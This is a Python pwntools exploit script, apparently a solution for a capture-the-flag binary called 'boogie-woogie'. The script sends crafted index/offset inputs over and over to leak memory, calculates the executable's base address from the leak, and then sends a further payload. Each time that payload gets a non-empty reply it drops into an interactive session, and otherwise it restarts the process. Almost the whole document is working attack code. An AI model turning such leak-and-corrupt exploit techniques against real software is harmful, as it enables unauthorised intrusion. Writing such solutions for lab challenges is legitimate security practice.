#!/usr/bin/python3

from pwn import *

exe = ELF('boogie-woogie', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe
context.log_level = 'warning'

# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])





while(1):
        p = process('boogie-woogie')
        
        def guessing(payload):
                p.sendlineafter(b'exception:', payload)
        payload = ""
        for i in range(6):
                payload = f"{149-i} -{0x13+i}"
                guessing(payload)
        p.recvuntil(b'the')
        base = u64(p.recv(6).ljust(8, b'\0'))-8+0x20
        print("exe base: " + hex(base))
        payload = f"{140-i} {0x1000}"
        guessing(payload)
        res = p.recvline()
        if res != b'\r\n':
                print(res)
                print(p.recvline())
                p.interactive()
                break           
        else:
                p.close()



